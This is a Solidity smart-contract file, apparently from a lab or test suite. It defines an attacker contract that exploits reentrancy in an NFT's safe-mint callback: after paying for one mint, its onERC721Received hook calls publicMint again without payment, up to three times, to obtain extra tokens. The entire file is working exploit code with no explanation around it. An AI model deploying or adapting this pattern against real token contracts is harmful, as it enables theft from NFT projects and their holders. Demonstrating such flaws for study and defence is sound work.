// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import "./BasicNFT.sol";
import "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";

contract SafeMintAttacker is IERC721Receiver {
    bytes4 private constant _ERC721_RECEIVED = 0x150b7a02;
    uint256 private counter = 0;

    function initiateAttack(address basicNFT_) external payable {
        BasicNFT basicNFT = BasicNFT(basicNFT_);
        // Mint one NFT
        basicNFT.publicMint{value: msg.value}(1);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        counter++;
        if (counter < 3) {
            BasicNFT(msg.sender).publicMint(1);
        }
        return _ERC721_RECEIVED;
    }
}
